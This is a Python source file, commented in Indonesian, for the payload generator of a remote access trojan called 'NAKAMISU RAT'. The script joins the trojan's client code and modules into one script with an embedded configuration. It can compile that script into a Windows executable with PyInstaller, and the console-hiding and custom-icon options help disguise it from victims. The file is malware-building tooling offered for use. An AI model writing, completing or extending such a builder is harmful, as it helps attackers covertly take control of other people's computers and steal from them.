import os
import json
import subprocess
import sys
from datetime import datetime

def generate_payload(settings):
    config = settings.config
    modules = settings.get_active_modules()

    # Baca kode dari rat.py dan modules.py
    base_dir = os.path.dirname(os.path.abspath(__file__))
    rat_path = os.path.join(base_dir, "rat.py")
    modules_path = os.path.join(base_dir, "modules.py")

    with open(rat_path, 'r') as f:
        rat_code = f.read()
    with open(modules_path, 'r') as f:
        modules_code = f.read()

    # Gabungkan menjadi satu file payload
    payload_content = f"""# NAKAMISU RAT - Generated {datetime.now().isoformat()}
# Config: {json.dumps(config)}
# Modules: {json.dumps(modules)}

import sys
import os
import json
import socket
import threading
import time
import struct
import platform
from datetime import datetime

{modules_code}

{rat_code}

if __name__ == "__main__":
    config = {json.dumps(config)}
    modules_list = {json.dumps(modules)}
    client = RATClient(config, modules_list)
    client.run()
"""

    # Tentukan nama file
    base_name = config.get("payload_name", "nakamisu_payload")
    if config.get("payload_type") == "python":
        filename = base_name + ".py"
        with open(filename, 'w') as f:
            f.write(payload_content)
        print(f"[+] Python payload generated: {filename}")
    elif config.get("payload_type") == "exe":
        # Buat file .py dulu
        py_filename = base_name + "_tmp.py"
        with open(py_filename, 'w') as f:
            f.write(payload_content)
        print("[*] Compiling to exe with PyInstaller...")
        try:
            cmd = ["pyinstaller", "--onefile", "--noconsole" if config.get('hide_console') else "", py_filename]
            if config.get('custom_icon'):
                cmd.extend(["--icon", config['custom_icon']])
            # Hapus argumen kosong
            cmd = [c for c in cmd if c]
            subprocess.run(cmd, check=True)
            # Pindahkan exe ke folder saat ini
            exe_name = base_name + ".exe"
            dist_exe = os.path.join("dist", base_name + "_tmp.exe")
            if os.path.exists(dist_exe):
                os.rename(dist_exe, exe_name)
                print(f"[+] Exe payload generated: {exe_name}")
            # Bersihkan file sementara
            os.remove(py_filename)
            subprocess.run(["rm", "-rf", "build", "dist"], shell=True)
            spec_file = base_name + "_tmp.spec"
            if os.path.exists(spec_file):
                os.remove(spec_file)
        except Exception as e:
            print(f"[-] Compilation failed: {e}")
    else:
        print(f"[-] Unknown payload type: {config.get('payload_type')}")
